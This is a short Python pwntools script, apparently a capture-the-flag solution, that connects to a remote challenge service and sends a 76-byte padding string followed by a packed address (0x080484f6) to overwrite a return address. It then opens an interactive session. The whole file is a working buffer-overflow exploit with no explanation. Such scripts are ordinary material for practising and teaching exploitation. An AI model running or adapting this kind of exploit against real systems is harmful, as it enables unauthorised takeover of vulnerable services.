from pwn import *

flag = p32(0x080484f6)

p = remote('jh2i.com', 50039)

payload = b"AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSS" #TTTTUUUUVVVVWWWWXXXXYYYYZZZZ"
payload += flag
input("attack_gdb")

print(p.recvuntil('Avast!'))
p.sendline(payload)
print(p.recv())

p.interactive()